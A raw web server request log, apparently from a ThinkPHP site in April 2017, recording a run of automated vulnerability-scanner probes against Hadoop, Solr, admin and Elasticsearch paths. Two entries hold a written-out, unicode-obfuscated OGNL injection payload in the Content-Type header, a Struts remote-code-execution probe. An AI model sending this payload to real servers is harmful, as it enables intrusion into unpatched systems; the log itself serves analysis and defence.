  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T12:28:42+08:00 ] 101.37.28.32 140.205.225.187 DELETE /bonirulfhsxk
[ log ] 101.37.28.32:80/bonirulfhsxk [运行时间：0.003216s][吞吐率：310.94req/s] [内存消耗：620.88kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'bonirulfhsxk',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'host' => '101.37.28.32:80',
  'connection' => 'close',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812.elasticsearch_unauthorized)',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T12:28:45+08:00 ] 101.37.28.32 140.205.225.187 GET /warning
[ log ] 101.37.28.32:80/warning [运行时间：0.003502s][吞吐率：285.56req/s] [内存消耗：619.87kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'warning',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T12:33:57+08:00 ] 101.37.28.32 140.205.225.187 GET /pleasereadthis
[ log ] 101.37.28.32:80/pleasereadthis [运行时间：0.003614s][吞吐率：276.71req/s] [内存消耗：619.91kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'pleasereadthis',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T12:38:07+08:00 ] 101.37.28.32 140.205.225.187 GET /please_read/_search
[ log ] 101.37.28.32:80/please_read/_search [运行时间：0.003561s][吞吐率：280.82req/s] [内存消耗：619.98kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'please_read',
    1 => '_search',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T12:42:18+08:00 ] 101.37.28.32 140.205.225.187 GET /about/
[ log ] 101.37.28.32:80/about/ [运行时间：0.003516s][吞吐率：284.42req/s] [内存消耗：619.86kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'about',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T12:45:07+08:00 ] 101.37.28.32 140.205.225.187 GET /clusters.jsf
[ log ] 101.37.28.32:80/clusters.jsf [运行时间：0.003519s][吞吐率：284.19req/s] [内存消耗：619.89kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'clusters.jsf',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T13:03:26+08:00 ] 101.37.28.32 185.110.132.232 GET /
[ log ] 101.37.28.32/ [运行时间：0.004932s][吞吐率：202.75req/s] [内存消耗：650.27kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '101.37.28.32',
  'connection' => 'close',
  'user-agent' => 'Scanbot',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T13:04:00+08:00 ] 101.37.28.32 140.205.225.187 GET /
[ log ] 101.37.28.32:80/ [运行时间：0.004948s][吞吐率：202.11req/s] [内存消耗：650.58kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T13:07:17+08:00 ] 101.37.28.32 140.205.225.187 POST /
[ log ] 101.37.28.32/ [运行时间：0.004927s][吞吐率：202.97req/s] [内存消耗：650.65kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'content-length' => '431',
  'host' => '101.37.28.32',
  'content-type' => 'multipart/form-data; boundary=-333053153',
  'connection' => 'close',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812.struts-s2-046)',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T13:07:21+08:00 ] 101.37.28.32 140.205.225.187 GET /hwi/
[ log ] 101.37.28.32:80/hwi/ [运行时间：0.007024s][吞吐率：142.37req/s] [内存消耗：619.86kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'hwi',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T13:09:34+08:00 ] 101.37.28.32 140.205.225.187 GET /
[ log ] 101.37.28.32:80/ [运行时间：0.002640s][吞吐率：378.79req/s] [内存消耗：650.58kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T13:09:51+08:00 ] 101.37.28.32 140.205.225.187 GET /
[ log ] 101.37.28.32:80/ [运行时间：0.002666s][吞吐率：375.09req/s] [内存消耗：650.58kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T13:09:56+08:00 ] 101.37.28.32 140.205.225.187 GET /
[ log ] 101.37.28.32:80/ [运行时间：0.002542s][吞吐率：393.39req/s] [内存消耗：650.58kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T13:09:59+08:00 ] 101.37.28.32 140.205.225.187 GET /jobs/
[ log ] 101.37.28.32:80/jobs/ [运行时间：0.003470s][吞吐率：288.17req/s] [内存消耗：619.86kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'jobs',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T13:10:02+08:00 ] 101.37.28.32 140.205.225.187 GET /index.php
[ log ] 101.37.28.32:80/index.php [运行时间：0.002556s][吞吐率：391.26req/s] [内存消耗：650.59kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T13:10:05+08:00 ] 101.37.28.32 140.205.225.187 GET /rs-status
[ log ] 101.37.28.32:80/rs-status [运行时间：0.003488s][吞吐率：286.69req/s] [内存消耗：619.88kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'rs-status',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T13:10:09+08:00 ] 101.37.28.32 140.205.225.187 GET /master-status
[ log ] 101.37.28.32:80/master-status [运行时间：0.003490s][吞吐率：286.54req/s] [内存消耗：619.90kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'master-status',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T13:10:10+08:00 ] 101.37.28.32 140.205.225.187 GET /dfshealth.html
[ log ] 101.37.28.32:80/dfshealth.html [运行时间：0.003467s][吞吐率：288.43req/s] [内存消耗：619.90kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'dfshealth',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T13:10:14+08:00 ] 101.37.28.32 140.205.225.187 GET /
[ log ] 101.37.28.32/ [运行时间：0.002562s][吞吐率：390.35req/s] [内存消耗：650.90kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '101.37.28.32',
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'content-type' => '${(\\u0023a1=333053153\\u0029\\u002e(#a2=1234567890).(#a3=#a1+#a2).(#a4=\'ttpS\\u0065rvletR\\u0065sponse\').(#a6=\'com.op\\u0065nsympho\').(#a5=\'ny.x\\u0077ork2.disp\\u0061tcher.H\').(#a7=#a6+#a5+#a4).(#a8=\'un\').(#a9=\'_\\u0061liy\').(#a10=#a9+#a8).(#x1=#cont\\u0065xt[#a7].getWr\\u0069ter()).(#x1.pr\\u0069nt(#a3+#a10)).(#x1.cl\\u006fse())}%0d%0a%20multipart/form-data',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T13:10:15+08:00 ] 101.37.28.32 140.205.225.187 POST /
[ log ] 101.37.28.32/ [运行时间：0.002551s][吞吐率：392.03req/s] [内存消耗：652.13kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '101.37.28.32',
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'content-type' => '${(\\u0023a1=333053153\\u0029\\u002e(#a2=1234567890).(#a3=#a1+#a2).(#a4=\'ttpS\\u0065rvletR\\u0065sponse\').(#a6=\'com.op\\u0065nsympho\').(#a5=\'ny.x\\u0077ork2.disp\\u0061tcher.H\').(#a7=#a6+#a5+#a4).(#a8=\'un\').(#a9=\'_\\u0061liy\').(#a10=#a9+#a8).(#x1=#cont\\u0065xt[#a7].getWr\\u0069ter()).(#x1.pr\\u0069nt(#a3+#a10)).(#x1.cl\\u006fse())}%0d%0a%20multipart/form-data',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-length' => '1',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T13:10:18+08:00 ] 101.37.28.32 140.205.225.187 GET /dfshealth.jsp
[ log ] 101.37.28.32:80/dfshealth.jsp [运行时间：0.003462s][吞吐率：288.84req/s] [内存消耗：619.90kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'dfshealth.jsp',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T13:10:20+08:00 ] 101.37.28.32 140.205.225.187 GET /hadoop/dfshealth.jsp
[ log ] 101.37.28.32:80/hadoop/dfshealth.jsp [运行时间：0.003474s][吞吐率：287.85req/s] [内存消耗：619.98kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'hadoop',
    1 => 'dfshealth.jsp',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T13:10:24+08:00 ] 101.37.28.32 140.205.225.187 GET /solr/
[ log ] 101.37.28.32:80/solr/ [运行时间：0.003421s][吞吐率：292.31req/s] [内存消耗：619.86kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'solr',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T13:10:26+08:00 ] 101.37.28.32 140.205.225.187 GET /
[ log ] 101.37.28.32:80/ [运行时间：0.002635s][吞吐率：379.51req/s] [内存消耗：650.58kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T13:10:32+08:00 ] 101.37.28.32 140.205.225.187 GET /info
[ log ] 101.37.28.32:80/info [运行时间：0.003476s][吞吐率：287.68req/s] [内存消耗：619.86kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'info',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T13:10:40+08:00 ] 101.37.28.32 140.205.225.187 GET /j_acegi_security_check
[ log ] 101.37.28.32:80/j_acegi_security_check [运行时间：0.003467s][吞吐率：288.43req/s] [内存消耗：619.98kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'j_acegi_security_check',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T13:12:26+08:00 ] 101.37.28.32 140.205.225.187 GET /admin/
[ log ] 101.37.28.32:80/admin/ [运行时间：0.006391s][吞吐率：156.47req/s] [内存消耗：620.59kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => 'Basic MTox',
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T13:20:21+08:00 ] 101.37.28.32 140.205.201.46 POST /dwgixatsbphk
[ log ] 101.37.28.32:80/dwgixatsbphk [运行时间：0.006986s][吞吐率：143.15req/s] [内存消耗：620.61kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'dwgixatsbphk',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'content-length' => '22',
  'host' => '101.37.28.32:80',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'close',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812.elasticsearch_unauthorized)',
)
[ info ] [ PARAM ] array (
  '{"aliyun":_"vulntest"}' => '',
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T13:20:21+08:00 ] 101.37.28.32 140.205.201.46 GET /dwgixatsbphk
[ log ] 101.37.28.32:80/dwgixatsbphk [运行时间：0.006628s][吞吐率：150.87req/s] [内存消耗：619.71kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'dwgixatsbphk',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'host' => '101.37.28.32:80',
  'connection' => 'close',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812.elasticsearch_unauthorized)',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T13:20:21+08:00 ] 101.37.28.32 140.205.201.46 DELETE /dwgixatsbphk
[ log ] 101.37.28.32:80/dwgixatsbphk [运行时间：0.006448s][吞吐率：155.09req/s] [内存消耗：620.88kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'dwgixatsbphk',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'host' => '101.37.28.32:80',
  'connection' => 'close',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812.elasticsearch_unauthorized)',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T13:21:35+08:00 ] 101.37.28.32 140.205.225.187 GET /
[ log ] 101.37.28.32:80/ [运行时间：0.002649s][吞吐率：377.49req/s] [内存消耗：650.69kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => 'Basic MTox',
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T13:29:48+08:00 ] 101.37.28.32 140.205.201.46 GET /
[ log ] 101.37.28.32:80/ [运行时间：0.002675s][吞吐率：373.82req/s] [内存消耗：650.58kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T13:33:35+08:00 ] 101.37.28.32 140.205.201.46 GET /
[ log ] 101.37.28.32:80/ [运行时间：0.004760s][吞吐率：210.08req/s] [内存消耗：650.58kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
